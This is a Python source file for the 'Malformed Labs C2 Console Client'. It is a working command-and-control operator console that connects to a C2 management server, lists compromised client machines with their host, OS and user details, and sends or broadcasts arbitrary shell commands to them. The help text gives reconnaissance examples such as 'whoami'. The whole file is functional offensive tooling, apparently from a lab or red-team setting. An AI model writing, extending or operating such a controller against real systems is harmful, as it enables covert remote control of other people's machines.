#!/usr/bin/env python3
"""
Malformed Labs C2 Console Client
Interactive console to manage C2 server and send commands to clients
"""

import socket
import json
import threading
import time
import sys
from datetime import datetime

class C2Console:
    def __init__(self, server_host='192.168.210.13', server_port=8889):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
    def connect(self):
        """Connect to C2 management server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            print(f"✅ Connected to C2 Management Server at {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"❌ Failed to connect to management server: {e}")
            return False
    
    def send_request(self, request):
        """Send management request to server"""
        try:
            data = json.dumps(request).encode('utf-8')
            length = len(data)
            self.socket.send(length.to_bytes(4, 'big'))
            self.socket.send(data)
            
            # Receive response
            length_bytes = self.socket.recv(4)
            if len(length_bytes) != 4:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            response_data = b''
            while len(response_data) < length:
                chunk = self.socket.recv(length - len(response_data))
                if not chunk:
                    return None
                response_data += chunk
            
            return json.loads(response_data.decode('utf-8'))
        except Exception as e:
            print(f"❌ Communication error: {e}")
            return None
    
    def list_clients(self):
        """List all connected clients"""
        request = {'type': 'list_clients'}
        response = self.send_request(request)
        
        if response and response.get('success'):
            clients = response.get('clients', [])
            if clients:
                print(f"\n📡 Connected Clients ({len(clients)}):")
                print("─" * 80)
                for client in clients:
                    info = client.get('info', {})
                    last_seen = client.get('last_seen', 'unknown')
                    print(f"🤖 ID: {client['id']}")
                    print(f"   📍 Address: {client['address']}")
                    print(f"   💻 Host: {info.get('hostname', 'unknown')} ({info.get('system', 'unknown')})")
                    print(f"   👤 User: {info.get('user', 'unknown')}")
                    print(f"   🕐 Last seen: {last_seen}")
                    print()
            else:
                print("\n📭 No clients currently connected")
        else:
            print("❌ Failed to get client list")
    
    def send_command(self, client_id, command):
        """Send command to specific client"""
        request = {
            'type': 'send_command',
            'client_id': client_id,
            'command': command
        }
        response = self.send_request(request)
        
        if response and response.get('success'):
            print(f"✅ Command sent to client {client_id}: {command}")
        else:
            error = response.get('error', 'Unknown error') if response else 'No response'
            print(f"❌ Failed to send command: {error}")
    
    def broadcast_command(self, command):
        """Send command to all clients"""
        request = {
            'type': 'broadcast_command',
            'command': command
        }
        response = self.send_request(request)
        
        if response and response.get('success'):
            client_count = response.get('client_count', 0)
            print(f"📢 Command broadcast to {client_count} clients: {command}")
        else:
            error = response.get('error', 'Unknown error') if response else 'No response'
            print(f"❌ Failed to broadcast command: {error}")
    
    def get_server_stats(self):
        """Get server statistics"""
        request = {'type': 'server_stats'}
        response = self.send_request(request)
        
        if response and response.get('success'):
            stats = response.get('stats', {})
            print(f"\n📊 Server Statistics:")
            print("─" * 40)
            print(f"🔄 Status: {stats.get('status', 'unknown')}")
            print(f"👥 Connected clients: {stats.get('client_count', 0)}")
            print(f"⏰ Uptime: {stats.get('uptime', 'unknown')}")
            print(f"📨 Total commands sent: {stats.get('commands_sent', 0)}")
        else:
            print("❌ Failed to get server stats")
    
    def interactive_console(self):
        """Run interactive console"""
        print("\n" + "="*60)
        print("🔥 MALFORMED LABS C2 COMMAND CONSOLE 🔥")
        print("="*60)
        print("\nCommands:")
        print("  📋 list                        - List connected clients")
        print("  📤 send <client_id> <command>  - Send command to specific client")
        print("  📢 broadcast <command>         - Send command to all clients")
        print("  📊 stats                       - Show server statistics")
        print("  🔄 refresh                     - Refresh client list")
        print("  ❓ help                        - Show this help")
        print("  🚪 quit                        - Exit console")
        print("─" * 60)
        
        while True:
            try:
                cmd_input = input("\n🔥 C2> ").strip()
                if not cmd_input:
                    continue
                
                parts = cmd_input.split(None, 2)
                command = parts[0].lower()
                
                if command in ['quit', 'exit', 'q']:
                    print("👋 Goodbye!")
                    break
                
                elif command in ['list', 'ls']:
                    self.list_clients()
                
                elif command == 'stats':
                    self.get_server_stats()
                
                elif command == 'refresh':
                    print("🔄 Refreshing...")
                    self.list_clients()
                
                elif command == 'help':
                    print("\n📖 Available Commands:")
                    print("  list                     - Show all connected clients")
                    print("  send <id> <cmd>         - Execute command on specific client")
                    print("  broadcast <cmd>         - Execute command on all clients")
                    print("  stats                   - Display server statistics")
                    print("  refresh                 - Refresh client information")
                    print("  help                    - Show this help message")
                    print("  quit                    - Exit the console")
                    print("\n💡 Example commands:")
                    print("  send abc123 whoami")
                    print("  broadcast uptime")
                    print("  send def456 ls -la /tmp")
                
                elif command == 'send' and len(parts) >= 3:
                    client_id = parts[1]
                    cmd_to_send = parts[2]
                    self.send_command(client_id, cmd_to_send)
                
                elif command == 'broadcast' and len(parts) >= 2:
                    cmd_to_send = parts[1]
                    self.broadcast_command(cmd_to_send)
                
                else:
                    print("❓ Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                print("\n👋 Console interrupted. Goodbye!")
                break
            except Exception as e:
                print(f"❌ Console error: {e}")
    
    def disconnect(self):
        """Disconnect from server"""
        if self.socket:
            self.socket.close()

def main():
    # Parse command line arguments
    server_host = sys.argv[1] if len(sys.argv) > 1 else '192.168.210.13'
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8889
    
    console = C2Console(server_host, server_port)
    
    if console.connect():
        try:
            console.interactive_console()
        except Exception as e:
            print(f"❌ Console error: {e}")
    else:
        print("❌ Could not connect to C2 management server.")
        print("💡 Make sure the C2 server is running with management interface enabled.")
    
    console.disconnect()

if __name__ == "__main__":
    main()